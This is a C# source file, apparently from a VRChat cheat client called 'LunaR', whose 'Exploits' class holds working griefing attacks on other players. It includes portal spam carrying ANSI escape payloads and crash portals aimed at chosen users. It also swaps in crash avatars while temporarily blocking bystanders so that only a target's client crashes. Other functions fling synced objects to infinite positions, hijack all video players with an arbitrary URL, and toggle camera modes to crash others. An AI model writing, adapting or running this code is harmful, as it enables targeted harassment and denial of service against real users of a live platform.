using LunaR.Extensions;
using LunaR.Wrappers;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using VRC;
using VRC.Core;
using VRC.SDK3.Components;
using VRC.UserCamera;
using VRCSDK2;

namespace LunaR.Modules
{
    internal class Exploits
    {
        public static void HideCollider(bool state)
        {
            if (Utils.CurrentUser == null) return;
            Utils.CurrentUser.transform.position += new Vector3(0f, state ? -1.7f : 1.7f, 0f);
            Utils.CurrentUser.GetComponentInChildren<VRC_AnimationController>().field_Private_Boolean_0 = !state;
            if (state) VRCVrCamera.field_Private_Static_VRCVrCamera_0.transform.parent.localPosition += new Vector3(0f, 1.7f / VRCVrCamera.field_Private_Static_VRCVrCamera_0.transform.parent.parent.transform.localScale.y, 0f);
            else VRCVrCamera.field_Private_Static_VRCVrCamera_0.transform.parent.localPosition = Vector3.zero;
        }

        public static bool CursedPortalToggle = false;

        public static IEnumerator WindowsPortal()
        {
            CursedPortalToggle = true;
            while (CursedPortalToggle && GeneralWrappers.IsInWorld())
            {
                string Ansi = "\a \u001b[?;251H \u001b[1;36m \u001b[0;102m Umbra hates you </3 \n\n\n\n\n\n\n\n\n\n\n \u001b[0;0H \a";
                PortalHandler.DropPortal(Ansi, Ansi, 0, new Vector3(5306f, 5306f, 5306f), Quaternion.identity, false, false);
                yield return new WaitForSeconds(1);
            }
            CursedPortalToggle = false;
        }

        public static bool MenuRemover = false;

        public static IEnumerator PortalColliderRemover()
        {
            MenuRemover = true;
            while (MenuRemover && GeneralWrappers.IsInWorld())
            {
                PortalHandler.DropPortal("wrld_5b89c79e-c340-4510-be1b-476e9fcdedcc", "999", 1, PortalHandler.Position.INFBypass, PortalHandler.Position.ROTBypass, false, true);
                yield return new WaitForSeconds(1);
                PortalHandler.DropPortal("wrld_5b89c79e-c340-4510-be1b-476e9fcdedcc", "999", 1, PortalHandler.Position.NegINFBypass, PortalHandler.Position.NegROTBypass, false, true);
                yield return new WaitForSeconds(1);
            }
            MenuRemover = false;
        }

        public static IEnumerator PortalSpam()
        {
            while (PortalHandler.PortalTargets.Count != 0)
            {
                if (GeneralWrappers.IsInWorld())
                {
                    foreach (Player player in Utils.PlayerManager.GetAllPlayers())
                    {
                        if (PortalHandler.PortalTargets.Contains(player.UserID())) PortalHandler.DropCrashPortal(player.GetVRCPlayer());
                    }
                }
                yield return new WaitForSeconds(1);
            }
        }


        private static bool CrashRunning = false;
        public static string BackAvatarID;

        public static IEnumerator AvatarCrash(bool active)
        {
            if (active)
            {
                BackAvatarID = Utils.CurrentUser.GetAPIAvatar().id;
                PlateChanger.Selfhide(true);
                yield return new WaitForEndOfFrame();
                PlayerExtensions.ChangeAvatar(ServerRequester.PCCrash);
            }
            else
            {
                PlayerExtensions.ChangeAvatar(BackAvatarID);
                yield return new WaitForEndOfFrame();
                PlateChanger.Selfhide(false);
            }
        }

        public static IEnumerator TargetAvatarCrash(Player Target, string AvatarID)
        {
            if (CrashRunning) yield break;
            List<Player> CachedCrashUsers = new();
            CrashRunning = true;
            Extensions.Logger.Log($"Crash Started on {Target.DisplayName()}", Extensions.Logger.LogsType.Info);
            foreach (Player player in Utils.PlayerManager.GetAllPlayers())
            {
                if (player.UserID() != Target.UserID() && player.UserID() != APIUser.CurrentUser.UserID() && !PlayerExtensions.IsBlocked(player.UserID())) CachedCrashUsers.Add(player);
            }
            foreach (Player player in CachedCrashUsers)
            {
                if (player != null)
                {
                    PhotonModule.Block(player.UserID(), true);
                    yield return new WaitForSeconds(0.33f);
                }
            }
            string BackSwitch = Utils.CurrentUser.GetAPIAvatar().id;
            PlateChanger.Selfhide(true);
            yield return new WaitForEndOfFrame();
            PlayerExtensions.ChangeAvatar(AvatarID);
            yield return new WaitForSeconds(8f);
            PlayerExtensions.ChangeAvatar(BackSwitch);
            yield return new WaitForEndOfFrame();
            PlateChanger.Selfhide(false);
            foreach (Player player in CachedCrashUsers)
            {
                if (player != null)
                {
                    PhotonModule.Block(player.UserID(), false);
                    yield return new WaitForSeconds(0.33f);
                }
            }
            Extensions.Logger.Log("Crash Done", Extensions.Logger.LogsType.Info);
            CrashRunning = false;
        }

        public static IEnumerator QuestCrash()
        {
            if (CrashRunning) yield break;
            CrashRunning = true;

            var BackSwitch = Utils.CurrentUser.GetAPIAvatar().id;
            PlateChanger.Selfhide(true);
            yield return new WaitForEndOfFrame();
            PlayerExtensions.ChangeAvatar(ServerRequester.QuestCrash);
            yield return new WaitForSeconds(8f);
            PlayerExtensions.ChangeAvatar(BackSwitch);
            yield return new WaitForEndOfFrame();
            PlateChanger.Selfhide(false);
            Extensions.Logger.Log("Crash Done", Extensions.Logger.LogsType.Info);

            CrashRunning = false;
        }

        public static void FloorDropper()
        {
            foreach (VRC_Pickup pickup in Object.FindObjectsOfType<VRC_Pickup>())
            {
                FreeFallPickup(pickup, 10).Start();
            }

            foreach (VRCPickup pickup in Object.FindObjectsOfType<VRCPickup>())
            {
                FreeFallPickup(pickup, 10).Start();
            }

            foreach (VRC_ObjectSync pickup in Object.FindObjectsOfType<VRC_ObjectSync>())
            {
                FreeFallPickup(pickup, 10).Start();
            }
        }

        public static void CrashItems()
        {
            foreach (VRC_Pickup pickup in Object.FindObjectsOfType<VRC_Pickup>())
            {
                ItemCrash(pickup, 15).Start();
            }

            foreach (VRCPickup pickup in Object.FindObjectsOfType<VRCPickup>())
            {
                ItemCrash(pickup, 15).Start();
            }
        }

        private static IEnumerator FreeFallPickup(VRC_Pickup Pickup, int HowMuchTime)
        {
            ItemHandler.TakeOwnershipIfNecessary(Pickup.gameObject);
            Pickup.GetComponent<Rigidbody>().mass = PortalHandler.Position.InfValue;
            Pickup.GetComponent<Rigidbody>().useGravity = true;
            Pickup.GetComponent<Rigidbody>().velocity = PortalHandler.Position.INFBypass;
            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = PortalHandler.Position.InfValue;
            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = PortalHandler.Position.InfValue;
            Pickup.GetComponent<Rigidbody>().isKinematic = false;
            Pickup.GetComponent<Rigidbody>().AddForce(PortalHandler.Position.INFBypass, ForceMode.Acceleration);
            Pickup.GetComponent<Rigidbody>().AddForce(PortalHandler.Position.INFBypass, ForceMode.Force);
            Pickup.GetComponent<Rigidbody>().AddForce(PortalHandler.Position.INFBypass, ForceMode.Impulse);
            Pickup.GetComponent<Rigidbody>().AddForce(PortalHandler.Position.INFBypass, ForceMode.VelocityChange);
            Pickup.GetComponent<Rigidbody>().angularVelocity = PortalHandler.Position.INFBypass;
            float TimeToStop = Time.time + HowMuchTime;
            while (Time.time < TimeToStop)
            {
                if (!Pickup.name.ToLower().Contains("viewdinder") && !Pickup.name.ToLower().Contains("avatardebugconsole"))
                {
                    Pickup.gameObject.SetActive(value: true);
                }
                Pickup.gameObject.transform.position = Vector3.zero;
                yield return new WaitForSeconds(1f);
                Pickup.gameObject.transform.position = PortalHandler.Position.INFBypass;
                yield return new WaitForSeconds(2f);
            }
            Pickup.gameObject.transform.position = Vector3.zero;
        }



        private static IEnumerator FreeFallPickup(VRC_ObjectSync Pickup, int HowMuchTime)
        {
            ItemHandler.TakeOwnershipIfNecessary(Pickup.gameObject);
            Pickup.GetComponent<Rigidbody>().mass = PortalHandler.Position.InfValue;
            Pickup.GetComponent<Rigidbody>().useGravity = true;
            Pickup.GetComponent<Rigidbody>().velocity = PortalHandler.Position.INFBypass;
            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = PortalHandler.Position.InfValue;
            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = PortalHandler.Position.InfValue;
            Pickup.GetComponent<Rigidbody>().isKinematic = false;
            Pickup.GetComponent<Rigidbody>().AddForce(PortalHandler.Position.INFBypass, ForceMode.Acceleration);
            Pickup.GetComponent<Rigidbody>().AddForce(PortalHandler.Position.INFBypass, ForceMode.Force);
            Pickup.GetComponent<Rigidbody>().AddForce(PortalHandler.Position.INFBypass, ForceMode.Impulse);
            Pickup.GetComponent<Rigidbody>().AddForce(PortalHandler.Position.INFBypass, ForceMode.VelocityChange);
            Pickup.GetComponent<Rigidbody>().angularVelocity = PortalHandler.Position.INFBypass;
            float TimeToStop = Time.time + HowMuchTime;
            while (Time.time < TimeToStop)
            {
                if (!Pickup.name.ToLower().Contains("viewdinder") && !Pickup.name.ToLower().Contains("avatardebugconsole"))
                {
                    Pickup.gameObject.SetActive(value: true);
                }
                Pickup.gameObject.transform.position = Vector3.zero;
                yield return new WaitForSeconds(1f);
                Pickup.gameObject.transform.position = PortalHandler.Position.INFBypass;
                yield return new WaitForSeconds(2f);
            }
            Pickup.gameObject.transform.position = Vector3.zero;
        }


        private static IEnumerator ItemCrash(VRCPickup Pickup, int HowMuchTime)
        {
            ItemHandler.TakeOwnershipIfNecessary(Pickup.gameObject);
            Pickup.proximity = PortalHandler.Position.InfValue;
            float TimeToStop = Time.time + HowMuchTime;
            while (Time.time < TimeToStop)
            {
                Pickup.transform.position = PortalHandler.Position.INFBypass;
                yield return new WaitForSeconds(1f);
                Pickup.transform.position = PortalHandler.Position.NegINFBypass;
                yield return new WaitForSeconds(1f);
            }
        }

        private static IEnumerator ItemCrash(VRC_Pickup Pickup, int HowMuchTime)
        {
            ItemHandler.TakeOwnershipIfNecessary(Pickup.gameObject);
            Pickup.proximity = PortalHandler.Position.InfValue;
            float TimeToStop = Time.time + HowMuchTime;
            while (Time.time < TimeToStop)
            {
                Pickup.transform.position = PortalHandler.Position.INFBypass;
                yield return new WaitForSeconds(1f);
                Pickup.transform.position = PortalHandler.Position.NegINFBypass;
                yield return new WaitForSeconds(1f);
            }
        }

        private static IEnumerator FreeFallPickup(VRCPickup Pickup, int HowMuchTime)
        {
            ItemHandler.TakeOwnershipIfNecessary(Pickup.gameObject);
            Pickup.GetComponent<Rigidbody>().mass = PortalHandler.Position.InfValue;
            Pickup.GetComponent<Rigidbody>().useGravity = true;
            Pickup.GetComponent<Rigidbody>().velocity = PortalHandler.Position.INFBypass;
            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = PortalHandler.Position.InfValue;
            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = PortalHandler.Position.InfValue;
            Pickup.GetComponent<Rigidbody>().isKinematic = false;
            Pickup.GetComponent<Rigidbody>().AddForce(PortalHandler.Position.INFBypass, ForceMode.Acceleration);
            Pickup.GetComponent<Rigidbody>().AddForce(PortalHandler.Position.INFBypass, ForceMode.Force);
            Pickup.GetComponent<Rigidbody>().AddForce(PortalHandler.Position.INFBypass, ForceMode.Impulse);
            Pickup.GetComponent<Rigidbody>().AddForce(PortalHandler.Position.INFBypass, ForceMode.VelocityChange);
            Pickup.GetComponent<Rigidbody>().angularVelocity = PortalHandler.Position.INFBypass;
            float TimeToStop = Time.time + HowMuchTime;
            while (Time.time < TimeToStop)
            {
                if (!Pickup.name.ToLower().Contains("viewdinder") && !Pickup.name.ToLower().Contains("avatardebugconsole"))
                {
                    Pickup.gameObject.SetActive(true);
                }
                Pickup.gameObject.transform.position = Vector3.zero;
                yield return new WaitForSeconds(1f);
                Pickup.gameObject.transform.position = PortalHandler.Position.INFBypass;
                yield return new WaitForSeconds(2f);
            }
        }

        public static void OverrideVideoPlayers(string url)
        {
            foreach (SyncVideoPlayer item in Object.FindObjectsOfType<SyncVideoPlayer>())
            {
                if (item != null)
                {
                    ItemHandler.TakeOwnershipIfNecessary(item.gameObject);
                    VRC_SyncVideoPlayer field_Private_VRC_SyncVideoPlayer_ = item.field_Private_VRC_SyncVideoPlayer_0;
                    field_Private_VRC_SyncVideoPlayer_.Stop();
                    field_Private_VRC_SyncVideoPlayer_.Clear();
                    field_Private_VRC_SyncVideoPlayer_.AddURL(url);
                    field_Private_VRC_SyncVideoPlayer_.Next();
                    field_Private_VRC_SyncVideoPlayer_.Play();
                }
            }

            foreach (SyncVideoStream item2 in Object.FindObjectsOfType<SyncVideoStream>())
            {
                if (item2 != null)
                {
                    ItemHandler.TakeOwnershipIfNecessary(item2.gameObject);
                    VRC_SyncVideoStream field_Private_VRC_SyncVideoStream_ = item2.field_Private_VRC_SyncVideoStream_0;
                    field_Private_VRC_SyncVideoStream_.Stop();
                    field_Private_VRC_SyncVideoStream_.Clear();
                    field_Private_VRC_SyncVideoStream_.AddURL(url);
                    field_Private_VRC_SyncVideoStream_.Next();
                    field_Private_VRC_SyncVideoStream_.Play();
                }
            }

            foreach (VRCUrlInputField item3 in Object.FindObjectsOfType<VRCUrlInputField>())
            {
                if (item3 != null)
                {
                    ItemHandler.TakeOwnershipIfNecessary(item3.gameObject);
                    item3.text = url;
                    item3.onEndEdit.Invoke(url);
                }
            }
        }

        public static bool CameraCrashToggle = false;

        public static IEnumerator CameraCrash()
        {
            CameraCrashToggle = true;
            UserCameraController instance = Utils.UserCameraController;
            while (CameraCrashToggle && GeneralWrappers.IsInWorld())
            {
                instance.prop_UserCameraMode_0 = UserCameraMode.Photo;
                yield return new WaitForEndOfFrame();
                instance.prop_UserCameraMode_0 = UserCameraMode.Off;
                yield return new WaitForEndOfFrame();
            }
            CameraCrashToggle = false;
        }
    }
}